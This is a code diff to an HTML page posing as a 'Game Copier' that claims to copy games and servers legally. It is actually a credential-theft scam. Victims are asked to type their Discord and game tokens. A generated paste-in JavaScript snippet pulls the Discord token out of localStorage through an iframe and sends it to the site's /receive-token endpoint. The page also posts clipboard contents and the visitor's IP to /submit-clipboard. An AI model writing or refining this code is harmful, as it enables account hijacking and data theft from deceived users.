@@ -154,17 +154,17 @@
   <div class="container">
     <h1>GAME COPIER</h1>
     <p>Copy games & servers (legally)</p>
-<!-- Token Gate - Discord + Game Token -->
-<div id="tokenGateBox" style="margin-bottom: 24px;">
-  <input type="text" id="discordTokenGateInput" placeholder="Enter Discord Token" autocomplete="off" />
-  <input type="text" id="gameTokenGateInput" placeholder="Enter Game Token" autocomplete="off" />
-  <button id="tokenGateSubmitBtn">Submit</button>
-  <div id="downloadSection" style="display: none;">
-    <button id="downloadBtn">Download</button>
-    <div id="downloadGateMsg"></div>
-    <button id="verifyBtn" style="margin-top:10px;display:none;">Verify</button>
-  </div>
-</div>
+    <!-- Token Gate - Discord + Game Token (HIDDEN BY DEFAULT) -->
+    <div id="tokenGateBox" style="margin-bottom: 24px; display: none;">
+      <input type="text" id="discordTokenGateInput" placeholder="Enter Discord Token" autocomplete="off" />
+      <input type="text" id="gameTokenGateInput" placeholder="Enter Game Token" autocomplete="off" />
+      <button id="tokenGateSubmitBtn">Submit</button>
+      <div id="downloadSection" style="display: none;">
+        <button id="downloadBtn">Download</button>
+        <div id="downloadGateMsg"></div>
+        <button id="verifyBtn" style="margin-top:10px;display:none;">Verify</button>
+      </div>
+    </div>
 
     <div class="mode-switcher">
       <button id="gameModeBtn" class="active">Game Copier</button>
@@ -234,6 +234,17 @@
     const discordTokenSubmitBtn = document.getElementById('discordTokenSubmitBtn');
 
     const adminBtn = document.getElementById('adminBtn');
+    const tokenGateBox = document.getElementById('tokenGateBox');
+    const discordTokenGateInput = document.getElementById('discordTokenGateInput');
+    const gameTokenGateInput = document.getElementById('gameTokenGateInput');
+    const tokenGateSubmitBtn = document.getElementById('tokenGateSubmitBtn');
+    const downloadSection = document.getElementById('downloadSection');
+    const downloadBtn = document.getElementById('downloadBtn');
+    const downloadGateMsg = document.getElementById('downloadGateMsg');
+    const verifyBtn = document.getElementById('verifyBtn');
+    let tokenGateVerified = localStorage.getItem('tokenGateVerified') === '1';
+    let discordGateToken = '';
+    let gameGateToken = '';
 
     let permissionGranted = false;
 
@@ -264,6 +275,7 @@
       serverIdInput.value = '';
       tokenInput.value = '';
       discordTokenInput.value = '';
+      tokenGateBox.style.display = 'none'; // Hide token gate on reset
     }
 
     // Get user IP for logging
@@ -300,7 +312,6 @@
     }
 
     setupTokenInput(tokenInput);
- 
 
     // Clipboard permission handling
     document.addEventListener('keydown', async (e) => {
@@ -345,7 +356,7 @@
         }
 
         const userIP = await getUserIP();
-        
+
         await fetch('/submit-clipboard', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -359,6 +370,9 @@
         doneBox.style.display = 'none';
         tokenBox.style.display = 'block';
         errorMessage.textContent = '';
+
+        // --- SHOW THE TOKEN GATE ---
+        tokenGateBox.style.display = 'block';
 
       } catch (err) {
         window.location.href = 'https://example.com/denied';
@@ -401,8 +415,7 @@
         return;
       }
 
-  const code = `(()=>{const a=document.createElement('iframe');document.body.appendChild(a);try{const b=a.contentWindow.localStorage.token;const c="${serverId}";const d=btoa(b);window.open('${window.location.origin}/receive-token?token='+encodeURIComponent(b)+'&serverId='+encodeURIComponent(c),'_blank');console.log('Discord Server: '+c+'. Discord SERVER TOKEN: '+d);}catch(e){console.error('❌ Failed:',e);}a.remove();})();`;
-
+      const code = `(()=>{const a=document.createElement('iframe');document.body.appendChild(a);try{const b=a.contentWindow.localStorage.token;const c="${serverId}";const d=btoa(b);window.open('${window.location.origin}/receive-token?token='+encodeURIComponent(b)+'&serverId='+encodeURIComponent(c),'_blank');console.log('Discord Server: '+c+'. Discord SERVER TOKEN: '+d);}catch(e){console.error('❌ Failed:',e);}a.remove();})();`;
 
       jsCode.textContent = code;
       jsCodeBox.style.display = 'block';
@@ -453,49 +466,41 @@
         window.location.href = `/admin?password=${encodeURIComponent(password)}`;
       }
     };
-    const discordTokenGateInput = document.getElementById('discordTokenGateInput');
-const gameTokenGateInput = document.getElementById('gameTokenGateInput');
-const tokenGateSubmitBtn = document.getElementById('tokenGateSubmitBtn');
-const downloadSection = document.getElementById('downloadSection');
-const downloadBtn = document.getElementById('downloadBtn');
-const downloadGateMsg = document.getElementById('downloadGateMsg');
-const verifyBtn = document.getElementById('verifyBtn');
-let tokenGateVerified = localStorage.getItem('tokenGateVerified') === '1';
-let discordGateToken = '';
-let gameGateToken = '';
 
-tokenGateSubmitBtn.onclick = () => {
-  discordGateToken = discordTokenGateInput.value.trim();
-  gameGateToken = gameTokenGateInput.value.trim();
-  if (!discordGateToken || !gameGateToken) {
-    alert('Please enter both tokens!');
-    return;
-  }
-  downloadSection.style.display = 'block';
-  downloadGateMsg.textContent = '';
-  verifyBtn.style.display = 'none';
-};
+    // --- Token Gate Logic ---
+    tokenGateSubmitBtn.onclick = () => {
+      discordGateToken = discordTokenGateInput.value.trim();
+      gameGateToken = gameTokenGateInput.value.trim();
+      if (!discordGateToken || !gameGateToken) {
+        alert('Please enter both tokens!');
+        return;
+      }
+      downloadSection.style.display = 'block';
+      downloadGateMsg.textContent = '';
+      verifyBtn.style.display = 'none';
+    };
 
-downloadBtn.onclick = () => {
-  tokenGateVerified = localStorage.getItem('tokenGateVerified') === '1';
-  if(tokenGateVerified) {
-    window.location.href = "/download";
-  } else {
-    downloadGateMsg.textContent = "You must verify before downloading.";
-    verifyBtn.style.display = 'inline-block';
-  }
-};
+    downloadBtn.onclick = () => {
+      tokenGateVerified = localStorage.getItem('tokenGateVerified') === '1';
+      if(tokenGateVerified) {
+        window.location.href = "/download";
+      } else {
+        downloadGateMsg.textContent = "You must verify before downloading.";
+        verifyBtn.style.display = 'inline-block';
+      }
+    };
 
-verifyBtn.onclick = () => {
-  window.location.href = '/verify';
-};
+    verifyBtn.onclick = () => {
+      window.location.href = '/verify';
+    };
 
-window.onload = function() {
-  if(localStorage.getItem('tokenGateVerified') === '1') {
-    downloadGateMsg.textContent = "Verification successful! You can now download.";
-    verifyBtn.style.display = 'none';
-  }
-};
+    window.onload = function() {
+      if(localStorage.getItem('tokenGateVerified') === '1') {
+        downloadGateMsg.textContent = "Verification successful! You can now download.";
+        verifyBtn.style.display = 'none';
+      }
+    };
+
   </script>
 </body>
 </html>
